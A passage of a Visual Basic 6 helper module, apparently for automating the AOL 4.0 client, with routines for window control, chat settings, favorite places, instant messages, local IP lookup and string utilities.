            Case 50: twips% = twips% + 151
            Case 51: twips% = twips% + 151
            Case 52: twips% = twips% + 151
            Case 53: twips% = twips% + 151
            Case 54: twips% = twips% + 151
            Case 55: twips% = twips% + 151
            Case 56: twips% = twips% + 151
            Case 57: twips% = twips% + 151
            Case 58: twips% = twips% + 85
            Case 59: twips% = twips% + 85
            Case 60: twips% = twips% + 170
            Case 61: twips% = twips% + 170
            Case 62: twips% = twips% + 170
            Case 63: twips% = twips% + 152
            Case 64: twips% = twips% + 284
            Case 65: twips% = twips% + 197
            Case 66: twips% = twips% + 193
            Case 67: twips% = twips% + 197
            Case 68: twips% = twips% + 197
            Case 69: twips% = twips% + 197
            Case 70: twips% = twips% + 175
            Case 71: twips% = twips% + 217
            Case 72: twips% = twips% + 194
            Case 73: twips% = twips% + 64
            Case 74: twips% = twips% + 119
            Case 75: twips% = twips% + 197
            Case 76: twips% = twips% + 147
            Case 77: twips% = twips% + 242
            Case 78: twips% = twips% + 197
            Case 79: twips% = twips% + 217
            Case 80: twips% = twips% + 197
            Case 81: twips% = twips% + 217
            Case 82: twips% = twips% + 197
            Case 83: twips% = twips% + 197
            Case 84: twips% = twips% + 151
            Case 85: twips% = twips% + 197
            Case 86: twips% = twips% + 197
            Case 87: twips% = twips% + 151
            Case 88: twips% = twips% + 197
            Case 89: twips% = twips% + 197
            Case 90: twips% = twips% + 151
            Case 91: twips% = twips% + 85
            Case 92: twips% = twips% + 87
            Case 93: twips% = twips% + 85
            Case 94: twips% = twips% + 104
            Case 95: twips% = twips% + 151
            Case 96: twips% = twips% + 85
            Case 97: twips% = twips% + 151
            Case 98: twips% = twips% + 151
            Case 99: twips% = twips% + 151
            Case 100: twips% = twips% + 151
            Case 101: twips% = twips% + 151
            Case 102: twips% = twips% + 64
            Case 103: twips% = twips% + 151
            Case 104: twips% = twips% + 151
            Case 105: twips% = twips% + 64
            Case 106: twips% = twips% + 64
            Case 107: twips% = twips% + 151
            Case 108: twips% = twips% + 64
            Case 109: twips% = twips% + 242
            Case 110: twips% = twips% + 151
            Case 111: twips% = twips% + 151
            Case 112: twips% = twips% + 151
            Case 113: twips% = twips% + 151
            Case 114: twips% = twips% + 85
            Case 115: twips% = twips% + 151
            Case 116: twips% = twips% + 85
            Case 117: twips% = twips% + 151
            Case 118: twips% = twips% + 105
            Case 119: twips% = twips% + 196
            Case 120: twips% = twips% + 151
            Case 121: twips% = twips% + 151
            Case 122: twips% = twips% + 151
            Case 123: twips% = twips% + 85
            Case 124: twips% = twips% + 64
            Case 125: twips% = twips% + 85
            Case 126: twips% = twips% + 170
            Case 127: twips% = twips% + 217
            Case 128: twips% = twips% + 217
            Case 129: twips% = twips% + 217
            Case 130: twips% = twips% + 66
            Case 131: twips% = twips% + 151
            Case 132: twips% = twips% + 85
            Case 133: twips% = twips% + 283
            Case 134: twips% = twips% + 151
            Case 135: twips% = twips% + 151
            Case 136: twips% = twips% + 85
            Case 137: twips% = twips% + 311
            Case 138: twips% = twips% + 196
            Case 139: twips% = twips% + 85
            Case 140: twips% = twips% + 285
            Case 141: twips% = twips% + 217
            Case 142: twips% = twips% + 217
            Case 143: twips% = twips% + 217
            Case 144: twips% = twips% + 217
            Case 145: twips% = twips% + 66
            Case 146: twips% = twips% + 66
            Case 147: twips% = twips% + 85
            Case 148: twips% = twips% + 85
            Case 149: twips% = twips% + 103
            Case 150: twips% = twips% + 75
            Case 151: twips% = twips% + 141
            Case 152: twips% = twips% + 85
            Case 153: twips% = twips% + 283
            Case 154: twips% = twips% + 151
            Case 155: twips% = twips% + 85
            Case 156: twips% = twips% + 264
            Case 157: twips% = twips% + 217
            Case 158: twips% = twips% + 217
            Case 159: twips% = twips% + 196
            Case 160: twips% = twips% + 85
            Case 161: twips% = twips% + 64
            Case 162: twips% = twips% + 151
            Case 163: twips% = twips% + 151
            Case 164: twips% = twips% + 151
            Case 165: twips% = twips% + 151
            Case 166: twips% = twips% + 64
            Case 167: twips% = twips% + 151
            Case 168: twips% = twips% + 85
            Case 169: twips% = twips% + 217
            Case 170: twips% = twips% + 85
            Case 171: twips% = twips% + 151
            Case 172: twips% = twips% + 170
            Case 173: twips% = twips% + 85
            Case 174: twips% = twips% + 217
            Case 175: twips% = twips% + 151
            Case 176: twips% = twips% + 103
            Case 177: twips% = twips% + 151
            Case 178: twips% = twips% + 85
            Case 179: twips% = twips% + 85
            Case 180: twips% = twips% + 85
            Case 181: twips% = twips% + 151
            Case 182: twips% = twips% + 151
            Case 183: twips% = twips% + 85
            Case 184: twips% = twips% + 85
            Case 185: twips% = twips% + 85
            Case 186: twips% = twips% + 103
            Case 187: twips% = twips% + 151
            Case 188: twips% = twips% + 236
            Case 189: twips% = twips% + 236
            Case 190: twips% = twips% + 236
            Case 191: twips% = twips% + 170
            Case 192: twips% = twips% + 196
            Case 193: twips% = twips% + 196
            Case 194: twips% = twips% + 196
            Case 195: twips% = twips% + 196
            Case 196: twips% = twips% + 196
            Case 197: twips% = twips% + 196
            Case 198: twips% = twips% + 283
            Case 199: twips% = twips% + 196
            Case 200: twips% = twips% + 196
            Case 201: twips% = twips% + 196
            Case 202: twips% = twips% + 196
            Case 203: twips% = twips% + 196
            Case 204: twips% = twips% + 66
            Case 205: twips% = twips% + 66
            Case 206: twips% = twips% + 66
            Case 207: twips% = twips% + 66
            Case 208: twips% = twips% + 196
            Case 209: twips% = twips% + 196
            Case 210: twips% = twips% + 217
            Case 211: twips% = twips% + 217
            Case 212: twips% = twips% + 217
            Case 213: twips% = twips% + 217
            Case 214: twips% = twips% + 217
            Case 215: twips% = twips% + 170
            Case 216: twips% = twips% + 217
            Case 217: twips% = twips% + 196
            Case 218: twips% = twips% + 196
            Case 219: twips% = twips% + 196
            Case 220: twips% = twips% + 196
            Case 221: twips% = twips% + 196
            Case 222: twips% = twips% + 196
            Case 223: twips% = twips% + 196
            Case 224: twips% = twips% + 151
            Case 225: twips% = twips% + 151
            Case 226: twips% = twips% + 151
            Case 227: twips% = twips% + 151
            Case 228: twips% = twips% + 151
            Case 229: twips% = twips% + 151
            Case 230: twips% = twips% + 264
            Case 231: twips% = twips% + 151
            Case 232: twips% = twips% + 151
            Case 233: twips% = twips% + 151
            Case 234: twips% = twips% + 151
            Case 235: twips% = twips% + 151
            Case 236: twips% = twips% + 66
            Case 237: twips% = twips% + 66
            Case 238: twips% = twips% + 66
            Case 239: twips% = twips% + 66
            Case 240: twips% = twips% + 151
            Case 241: twips% = twips% + 151
            Case 242: twips% = twips% + 151
            Case 243: twips% = twips% + 151
            Case 244: twips% = twips% + 151
            Case 245: twips% = twips% + 151
            Case 246: twips% = twips% + 151
            Case 247: twips% = twips% + 151
            Case 248: twips% = twips% + 151
            Case 249: twips% = twips% + 151
            Case 200: twips% = twips% + 151
            Case 201: twips% = twips% + 151
            Case 202: twips% = twips% + 151
            Case 203: twips% = twips% + 151
            Case 204: twips% = twips% + 151
            Case 205: twips% = twips% + 151
        End Select
    Next ctr%
     twiplen = twips%
End Function
Sub AddToComboPreventDupes(itm As String, cmb As ComboBox)
Dim XX
If cmb.ListCount = 0 Then
cmb.AddItem itm
Exit Sub
End If
Do Until XX = (cmb.ListCount)
Let diss_itm$ = cmb.List(XX)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let XX = XX + 1
Loop
If do_it = "NO" Then Exit Sub
cmb.AddItem itm
End Sub
Sub AddToListPreventDupes(itm As String, Lst As ListBox)
Dim XX
If Lst.ListCount = 0 Then
Lst.AddItem itm
Exit Sub
End If
Do Until XX = (Lst.ListCount)
Let diss_itm$ = Lst.List(XX)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let XX = XX + 1
Loop
If do_it = "NO" Then Exit Sub
Lst.AddItem itm
End Sub
Function GetMyIPAddress()
Dim WSAD As WSADATA
Dim iReturn As Integer
Dim sLowByte As String, sHighByte As String, sMsg As String
iReturn = WSAStartup(WS_VERSION_REQD, WSAD)
If iReturn <> 0 Then
       MsgBox "Winsock.dll is not responding."
       GetMyIPAddress = 0
End
End If
If lobyte(WSAD.wversion) < WS_VERSION_MAJOR _
Or (lobyte(WSAD.wversion) = WS_VERSION_MAJOR _
And hibyte(WSAD.wversion) < WS_VERSION_MINOR) Then
sHighByte = Trim$(str$(hibyte(WSAD.wversion)))
sLowByte = Trim$(str$(lobyte(WSAD.wversion)))
sMsg = "Windows Sockets version " & sLowByte & "." & sHighByte
sMsg = sMsg & " is not supported by winsock.dll "
MsgBox sMsg
GetMyIPAddress = 0
End
End If
If WSAD.iMaxSockets < MIN_SOCKETS_REQD Then
sMsg = "This application requires a minimum of "
sMsg = sMsg & Trim$(str$(MIN_SOCKETS_REQD)) _
& " supported sockets."
MsgBox sMsg
GetMyIPAddress = 0
End
End If
       Dim hostname As String * 256
       Dim hostent_addr As Long
       Dim host As HOSTENT
       Dim hostip_addr As Long
       Dim temp_ip_address() As Byte
       Dim I As Integer
       Dim ip_address As String
              If gethostname(hostname, 256) = SOCKET_ERROR Then
                     MsgBox "Windows Sockets error " & str(WSAGetLastError())
                     GetMyIPAddress = 0
                     Exit Function
              Else
                     hostname = Trim$(hostname)
              End If
            hostent_addr = gethostbyname(hostname)
              If hostent_addr = 0 Then
                    ' MsgBox "Winsock.dll is not responding. Make sure you are connected to the internet."
                     MsgBox "Winsock.dll is not responding. Make sure you are connected to the internet."
                     GetMyIPAddress = 0
                     Exit Function
              End If
       RtlMoveMemory host, hostent_addr, LenB(host)
       RtlMoveMemory hostip_addr, host.hAddrList, 4
       ReDim temp_ip_address(1 To host.hLength)
       RtlMoveMemory temp_ip_address(1), hostip_addr, host.hLength
              For I = 1 To host.hLength
                     ip_address = ip_address & temp_ip_address(I) & "."
              Next
          ip_address = Mid$(ip_address, 1, Len(ip_address) - 1)
       'MsgBox hostname
         Dim lReturn As Long
       lReturn = WSACleanup()
              If lReturn <> 0 Then
                     MsgBox "Socket error " & Trim$(str$(lReturn)) & " occurred" & "in Cleanup "
              GetMyIPAddress = 0
End If
GetMyIPAddress = ip_address
End Function
Function hibyte(ByVal wParam As Integer)
'used for getting your ip address
       hibyte = wParam \ &H100 And &HFF&
End Function
Function lobyte(ByVal wParam As Integer)
'used for getting your ip address
       lobyte = wParam And &HFF&
End Function
Function LocateMember(SN, Optional Close_Screen As Boolean = False) As String
AOL% = FindWindow("aol frame25", vbNullString)
tol% = FindChildByClass(AOL%, "AOL Toolbar")
twl% = FindChildByClass(tol%, "_aol_toolbar")
Ico% = FindChildByClass(twl%, "_aol_icon")
Ico% = GetWindow(Ico%, 2)
For ing = 1 To 8
Ico = GetWindow(Ico, 2)
Next ing
Call SendMessage(Ico, WM_CHAR, 76, 0)
Do
DoEvents
    loa% = FindChildByTitle(AOLMDI, "Locate Member Online")
    Txt% = FindChildByClass(loa, "_AOL_Edit")
    If Txt <> 0 Then Exit Do
Loop
SetText Txt, SN
SendMessage Txt, WM_CHAR, 13, 0
Do
DoEvents
    box% = FindWindow("#32770", "America Online")
    fnd% = FindChildByTitle(AOLMDI, "Locate *")
    If fnd <> loa And fnd <> 0 Then Exit Do
    If box <> 0 Then
            KillWin box
            KillWin loa
            LocateMember = SN & " is not currently signed on."
            Exit Function
    End If
Loop
KillWin loa
Do
DoEvents
fnd% = FindChildByTitle(AOLMDI, "Locate *")
stc = FindChildByClass(fnd, "_AOL_Static")
jik = GetText(stc)
Loop Until jik <> ""
LocateMember = jik
If Close_Screen = False Then Exit Function
KillWin fnd
End Function
Function Divide(num As Integer, Num2 As Integer)
Divide = val(num) / val(Num2)
End Function
Function Multiply(num As Integer, Num2 As Integer)
Multiply = val(num) * val(Num2)
End Function
Function Add(num As Integer, Num2 As Integer)
Add = val(num) + val(Num2)
End Function
Function Subtract(num As Integer, Num2 As Integer)
Subtract = val(num) - val(Num2)
End Function
Public Function IsStringAlpha(s As String) As Long
   Dim I As Long
   For I = 1 To Len(s)
      If IsCharAlpha(Asc(Mid$(s, I, 1))) = 0 Then
         IsStringAlpha = I
         Exit Function
      End If
   Next I
   IsStringAlpha = 0
End Function
Public Function IsStringNumeric(s As String) As Long
   Dim I As Long
   Dim J As Byte
   For I = 1 To Len(s)
      J = Asc(Mid$(s, I, 1))
      If IsCharAlphaNumeric(J) = 1 Then
         If IsCharAlpha(J) = 1 Then
            IsStringNumeric = I
            Exit Function
         End If
      Else
         IsStringNumeric = I
         Exit Function
      End If
   Next I
   IsStringNumeric = 0
End Function
Public Sub SetComboWidth(oComboBox As ComboBox, lWidth As Long)
SendMessage oComboBox.hwnd, CB_SETDROPPEDWIDTH, lWidth, 0
End Sub
Function GetCharCount(Text As String) As String
GetCharCount = Len(Text)
End Function
Function GetChatCharCount()
Room% = AOL40_FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
ChatText$ = GetText(AORich%)
GetChatCharCount = ChatText$
GetChatCharCount = Len(ChatText$)
End Function
Public Sub UnloadAllForms()
Dim Form As Form
   For Each Form In Forms
      Unload Form
      Set Form = Nothing
   Next Form
End Sub
Function ShowCBDrop(blah As ComboBox)
Dim R As Long
   R = SendMessageLong(blah.hwnd, CB_SHOWDROPDOWN, True, 0)
End Function
Function HideCBDrop(blah As ComboBox)
Dim R As Long
   R = SendMessageLong(blah.hwnd, CB_SHOWDROPDOWN, False, 0)
End Function
Public Sub DisableTrap(CurForm As Form)
Dim erg As Long
Dim NewRect As RECT
With NewRect
    .Left = 0&
    .Top = 0&
    .Right = Screen.Width / Screen.TwipsPerPixelX
    .Bottom = Screen.Height / Screen.TwipsPerPixelY
End With
erg& = ClipCursor(NewRect)
End Sub
Public Sub EnableTrap(CurForm As Form)
Dim X As Long, Y As Long, erg As Long
Dim NewRect As RECT
X& = Screen.TwipsPerPixelX
Y& = Screen.TwipsPerPixelY
With NewRect
    .Left = CurForm.Left / X&
    .Top = CurForm.Top / Y&
    .Right = .Left + CurForm.Width / X&
    .Bottom = .Top + CurForm.Height / Y&
End With
erg& = ClipCursor(NewRect)
End Sub
Public Sub KillWait()
Call RunMenuByString3("&About America Online")
Do
modal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(modal%, "_AOL_Icon")
Pause 0.00001
Loop Until modal% <> 0
Do:
modal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(modal%, "_AOL_Icon")
Call ClickIcon(AOIcon%)
Pause 0.00001
Loop Until modal% = 0
End Sub
Function GetOnlineTime()
PoPup 5, "O"
Do
AOL% = AOLModal()
AOL% = FindChildByClass(AOL%, "_AOL_Static")
GetOnlineTime = GetAPIText(AOL%)
Loop Until AOL% <> 0
Do:
modal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(modal%, "_AOL_Icon")
Call ClickIcon(AOIcon%)
Pause 0.00001
Loop Until modal% = 0
End Function
Function GetAOLVersion()
Call RunMenuByString3("&About America Online")
Do
AOL% = AOLModal()
AOL% = FindChildByClass(AOL%, "_AOL_Static")
GetAOLVersion = GetAPIText(AOL%)
Loop Until AOL% <> 0
Do:
modal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(modal%, "_AOL_Icon")
Call ClickIcon(AOIcon%)
Pause 0.00001
Loop Until modal% = 0
End Function
Function SetChatPrefs(arrive, leave, dblspc, alpha, sound) As Boolean
chat% = FindChildByClass(AOL40_FindChatRoom(), "_AOL_ICON")
AOIcon% = GetWindow(chat%, 2)
A = GetWindow(AOIcon%, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
ClickIcon (A)
Do: DoEvents
aom = FindWindow("_AOL_MODAL", vbNullString)
Loop Until aom <> 0
timeout 1
aom = FindWindow("_AOL_MODAL", vbNullString)
chk = FindChildByClass(aom, "_AOL_CheckBox")
C1 = GetWindow(chk, 2)
C2 = GetWindow(C1, 2)
C3 = GetWindow(C2, 2)
C4 = GetWindow(C3, 2)
X = SendMessage(chk, BM_SETCHECK, arrive, 0)
X = SendMessage(C1, BM_SETCHECK, leave, 0)
X = SendMessage(C2, BM_SETCHECK, dblspc, 0)
X = SendMessage(C3, BM_SETCHECK, alpha, 0)
X = SendMessage(C4, BM_SETCHECK, sound, 0)
OKButton% = FindChildByClass(aom, "_AOL_ICON")
ClickIcon (OKButton%)
Pause 1
AOLMsgClose
End Function
Sub MaximizeAol()
AOL% = FindWindow("AOL Frame25", vbNullString)
X = ShowWindow(AOL%, SW_MAXIMIZE)
End Sub
Sub MinimizeAol()
AOL% = FindWindow("AOL Frame25", vbNullString)
X = ShowWindow(AOL%, SW_MINIMIZE)
End Sub
Sub PoPup(icon As Integer, letter As String)
On Error Resume Next
e% = FindWindow("#32768", vbNullString)
A% = FindWindow("AOL Frame25", vbNullString)
B% = FindWindowEx(A%, 0, "AOL Toolbar", vbNullString)
c% = FindWindowEx(B%, 0, "_AOL_Toolbar", vbNullString)
d% = FindWindowEx(c%, 0, "_AOL_ICON", vbNullString)
For I = 1 To icon
d% = GetWindow(d%, 2)
Next I
n% = PostMessage(d%, WM_LBUTTONDOWN, 0&, 0&)
n% = PostMessage(d%, WM_LBUTTONUP, 0&, 0&)
Do
DoEvents
e2% = FindWindow("#32768", vbNullString)
Loop Until e2% <> e%
charactr% = Asc(letter)
Call PostMessage(e2%, WM_CHAR, charactr%, 0)
End Sub
Sub PopUp2(icon As Integer, letter As String, letter2 As String)
On Error Resume Next
e% = FindWindow("#32768", vbNullString)
A% = FindWindow("AOL Frame25", vbNullString)
B% = FindWindowEx(A%, 0, "AOL Toolbar", vbNullString)
c% = FindWindowEx(B%, 0, "_AOL_Toolbar", vbNullString)
d% = FindWindowEx(c%, 0, "_AOL_ICON", vbNullString)
For I = 1 To icon
d% = GetWindow(d%, 2)
Next I
n% = PostMessage(d%, WM_LBUTTONDOWN, 0&, 0&)
n% = PostMessage(d%, WM_LBUTTONUP, 0&, 0&)
Do
DoEvents
e2% = FindWindow("#32768", vbNullString)
Loop Until e2% <> e%
charactr% = Asc(letter)
charactr2% = Asc(letter2)
Call PostMessage(e2%, WM_CHAR, charactr%, 0)
Call PostMessage(e2%, WM_CHAR, charactr2%, 0)
End Sub
Sub FavoritePlaceAdd(url As String, Description As String)
'adds url and description to favorite places
PoPup 6, "f"
Pause 1
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "Favorite Places")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 2
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
Pause 2
caca2% = FindChildByTitle(MDI%, "Add New Folder/Favorite Place")
AOIcon3% = FindChildByClass(caca2%, "_AOL_Edit")
AOIcon3% = GetWindow(AOIcon3%, GW_HWNDNEXT)
AOIcon3% = GetWindow(AOIcon3%, GW_HWNDNEXT)
X = SendMessageByString(AOIcon3%, WM_SETTEXT, 0, Description)
AOIcon3% = GetWindow(AOIcon3%, GW_HWNDNEXT)
AOIcon3% = GetWindow(AOIcon3%, GW_HWNDNEXT)
X = SendMessageByString(AOIcon3%, WM_SETTEXT, 0, url)
Pause 1
AOIcon2% = FindChildByClass(caca2%, "_AOL_Icon")
For l = 1 To 1
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
Pause 1
KillWin (caca%)
End Sub
Sub FavoritePlaceNewFolder(Description As String)
'adds new folder to favorite places
PoPup 6, "f"
Pause 1
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca1% = FindChildByTitle(MDI%, "Favorite Places")
AOIcon2% = FindChildByClass(caca1%, "_AOL_Icon")
For l = 1 To 2
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
Pause 1
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "Add New Folder/Favorite Place")
AOIcon% = FindChildByClass(caca%, "_AOL_Checkbox")
For l = 1 To 1
AOIcon% = GetWindow(AOIcon%, 2)
Next l
Pause 1
B = SendMessage(AOIcon%, WM_LBUTTONDOWN, 0, 0&)
B = SendMessage(AOIcon%, WM_LBUTTONUP, 0, 0&)
SetCheckBoxToTrue (AOIcon%)
Pause 0.5
caca2% = FindChildByTitle(MDI%, "Add New Folder/Favorite Place")
AOIcon3% = FindChildByClass(caca2%, "_AOL_Edit")
X = SendMessageByString(AOIcon3%, WM_SETTEXT, 0, Description)
Pause 1
AOIcon2% = FindChildByClass(caca2%, "_AOL_Icon")
For l = 1 To 0
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
Pause 1
KillWin (caca1%)
End Sub
Sub FavoritePlaceAddTop()
PoPup 6, "a"
Pause 0.6
AOL% = FindWindow("_AOL_Modal", vbNullString)
MDI% = FindChildByClass(AOL%, "_AOL_Icon")
For l = 1 To 0
MDI% = GetWindow(MDI%, 2)
Next l
Call ClickIcon(MDI%, True)
End Sub
Sub FavoritePlaceSendInIM(Recipiant As String, killim As Boolean)
PoPup 6, "a"
Pause 0.6
AOL% = FindWindow("_AOL_Modal", vbNullString)
MDI% = FindChildByClass(AOL%, "_AOL_Icon")
For l = 1 To 1
MDI% = GetWindow(MDI%, 2)
Next l
Call ClickIcon(MDI%, True)
Pause 1
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca2% = FindChildByTitle(MDI%, "Send Instant Message")
AOIcon3% = FindChildByClass(caca2%, "_AOL_Edit")
X = SendMessageByString(AOIcon3%, WM_SETTEXT, 0, Recipiant)
Pause 0.5
caca% = FindChildByTitle(MDI%, "Send Instant Message")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 9
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
Pause 2
If killim = True Then
Do
beer = FindChildByTitle(AOLMDI, "  Instant Message To:")
Loop Until beer <> 0
KillWin (beer)
Else
End If
End Sub
Sub FavoritePlaceSendInMail(Recipiant As String)
PoPup 6, "a"
Pause 1
AOL% = FindWindow("_AOL_Modal", vbNullString)
MDI% = FindChildByClass(AOL%, "_AOL_Icon")
For l = 1 To 2
MDI% = GetWindow(MDI%, 2)
Next l
Call ClickIcon(MDI%, True)
Pause 2
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca2% = FindChildByTitle(MDI%, "Write Mail")
AOIcon3% = FindChildByClass(caca2%, "_AOL_Edit")
X = SendMessageByString(AOIcon3%, WM_SETTEXT, 0, Recipiant)
Pause 1
ClickSend
Pause 2
Do:
modal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(modal%, "_AOL_Icon")
Call ClickIcon(AOIcon%)
Pause 0.00001
Loop Until modal% = 0
End Sub
Function CloseAllExceptFront()
Call RunMenuByString3("Close &All Except Front")
End Function
Public Function GetToken(s As String, token As String, ByVal Nth As Integer) As String
   'Ex: GetToken("This is a test.", " ", 2) = "is"
   Dim I As Integer
   Dim p As Integer
   Dim R As Integer
   If Nth < 1 Then
      GetToken = ""
      Exit Function
   End If
   R = 0
   For I = 1 To Nth
      p = R
      R = InStr(p + 1, s, token)
      If R = 0 Then
         If I = Nth Then
            GetToken = Mid$(s, p + 1, Len(s) - p)
         Else
            GetToken = ""
         End If
         Exit Function
      End If
   Next I
   GetToken = Mid$(s, p + 1, R - p - 1)
End Function
Public Function GetTokens(sTxt As String, sToken As String) As Variant
    'Ex:  GetTokens("This is a test.") = ({ "This", "is", "a", "test." })
    Dim iTokenLen As Integer
    Dim iTokenCnt As Integer
    Dim lOffset As Long
    Dim lPrevOffset As Long
    Dim aTokens() As String
    iTokenLen = Len(sToken)
    lOffset = InStr(sTxt, sToken)
    Do While lOffset > 0
        ReDim Preserve aTokens(iTokenCnt)
        If lOffset - lPrevOffset > 1 Then
            aTokens(iTokenCnt) = Mid$(sTxt, lPrevOffset + 1, lOffset - 1 - lPrevOffset)
        Else
            aTokens(iTokenCnt) = ""
        End If
        lPrevOffset = lOffset
        lOffset = InStr(lOffset + iTokenLen, sTxt, sToken)
        iTokenCnt = iTokenCnt + 1
    Loop
    ReDim Preserve aTokens(iTokenCnt)
    aTokens(iTokenCnt) = Mid$(sTxt, lPrevOffset + 1)
    GetTokens = CVar(aTokens)
End Function
Function Int2String(ByVal l As Double) As String
'another number to string converter(works better)
   Dim tmp As String
   Dim str As String
   Dim I As Integer
   Dim J As Integer
   tmp = Format(l, "000000000000")
   str = ""
   If Len(tmp) > 12 Then
      Int2String = ""
      Exit Function
   End If
   If val(tmp) = 0 Then
      Int2String = "zero"
      Exit Function
   End If
   I = val(Left$(tmp, 3))
   If I <> 0 Then
      GoSub do_hundreds
      str = str + " trillion"
   End If
   I = val(Mid$(tmp, 4, 3))
   If I <> 0 Then
      GoSub do_hundreds
      str = str + " million"
   End If
   I = val(Mid$(tmp, 7, 3))
   If I <> 0 Then
      GoSub do_hundreds
      str = str + " thousand"
   End If
   I = val(Right$(tmp, 3))
   If I <> 0 Then
      GoSub do_hundreds
   End If
   Int2String = str
   Exit Function
do_hundreds:
   If I > 99 Then
      J = I
      I = I \ 100
      GoSub do_ones
      str = str + " hundred"
      I = J Mod 100
   End If
   If I <> 0 Then
      GoSub do_tens
   End If
   Return
do_tens:
   Select Case I Mod 100
      Case 90 To 99:
         str = str + " ninety"
         GoSub do_ones
      Case 80 To 89:
         str = str + " eighty"
         GoSub do_ones
      Case 70 To 79:
         str = str + " seventy"
         GoSub do_ones
      Case 60 To 69:
         str = str + " sixty"
         GoSub do_ones
      Case 50 To 59:
         str = str + " fifty"
         GoSub do_ones
      Case 40 To 49:
         str = str + " forty"
         GoSub do_ones
      Case 30 To 39:
         str = str + " thirty"
         GoSub do_ones
      Case 20 To 29:
         str = str + " twenty"
         GoSub do_ones
      Case 19: str = str + " nineteen"
      Case 18: str = str + " eighteen"
      Case 17: str = str + " seventeen"
      Case 16: str = str + " sixteen"
      Case 15: str = str + " fifteen"
      Case 14: str = str + " fourteen"
      Case 13: str = str + " thirteen"
      Case 12: str = str + " twelve"
      Case 11: str = str + " eleven"
      Case 10: str = str + " ten"
      Case Else
         GoSub do_ones
   End Select
   Return
do_ones:
   If I < 10 Or I Mod 10 = 0 Then
      str = str + " "
   Else
      str = str + "-"
   End If
   Select Case I Mod 10
      Case 9: str = str + "nine"
      Case 8: str = str + "eight"
      Case 7: str = str + "seven"
      Case 6: str = str + "six"
      Case 5: str = str + "five"
      Case 4: str = str + "four"
      Case 3: str = str + "three"
      Case 2: str = str + "two"
      Case 1: str = str + "one"
   End Select
   Return
End Function
Public Function AddBackslash(s As String) As String
   If Len(s) > 0 Then
      If Right$(s, 1) <> "\" Then
         AddBackslash = s + "\"
      Else
         AddBackslash = s
      End If
   Else
      AddBackslash = "\"
   End If
End Function
Public Function RemoveBackslash(s As String) As String
   Dim I As Integer
   I = Len(s)
   If I <> 0 Then
      If Right$(s, 1) = "\" Then
         RemoveBackslash = Left$(s, I - 1)
      Else
         RemoveBackslash = s
      End If
   Else
      RemoveBackslash = ""
   End If
End Function
Public Function GetTempPath() As String
   Dim s As String
   Dim I As Integer
   I = GetTempPathA(0, "")
   s = Space(I)
   Call GetTempPathA(I, s)
   GetTempPath = AddBackslash(Left$(s, I - 1))
End Function
Function AOLWindow() As Long
'Returns the handle of aol.
Dim AOL As Long
AOL = FindWindow("AOL Frame25", vbNullString)
AOLWindow = AOL
End Function
Sub MenuAppend(Handle As Long, Position As Long, StringToPlace As String)
'Appends a menu to a submenu(a.k.a. the pop-up menu that
'appears when you click on a menu at the top level). The
'handle is the submenu's handle, the position is the position
'in the menu where to place the new menu, and the
'stringtoplace is the string to set in the menu's text.
AppendMenu Handle, MF_STRING Or MF_BYPOSITION, Position, StringToPlace
End Sub
Sub CreateAOLMenu(num As Long, blah As String)
Dim AOLWin&, menu&
 AOLWin& = AOLWindow
  menu& = GetMenu(AOLWin&)
   MenuAppend menu&, num, blah
End Sub
Sub MenuRemove(Handle As Long, Position As Long)
'Removes a menu. This is not like destroying a menu.
RemoveMenu Handle, Position, MF_BYPOSITION
End Sub
Sub RemoveAOLMenu(num As Long)
Dim AOLWin&, menu&
 AOLWin& = AOLWindow
  menu& = GetMenu(AOLWin&)
   MenuRemove menu&, num
End Sub
Function ExtractNumbersFromString(SN As String) As String
'Returns the numbers from a screen name.
Dim Check As Long
Dim stringer As String
Dim word As String
For Check = 1 To Len(SN)
    stringer = Mid(SN, Check, 1)
        If IsNumeric(stringer) = True Then
            word = word & stringer
        End If
Next Check
ExtractNumbersFromString = word
End Function
Function ExtractLettersFromString(SN As String) As String
'Extracts the letters from a screen name.
Dim Check As Long
Dim stringer As String
Dim word As String
For Check = 1 To Len(SN)
    stringer = Mid(SN, Check, 1)
        If IsNumeric(stringer) = False Then
            word = word & stringer
        End If
Next Check
ExtractLettersFromString = word
End Function
Sub ComboToText(TheCombo As ComboBox, Text As TextBox)
Dim Y
For Y = 0 To TheCombo.ListCount - 1
tt$ = tt$ + TheCombo.List(Y) + ", "
Next Y
timeout (0.01)
Text.Text = tt$
End Sub
Function ListToText(thelist As ListBox, Text As TextBox)
Dim Y
For Y = 0 To thelist.ListCount - 1
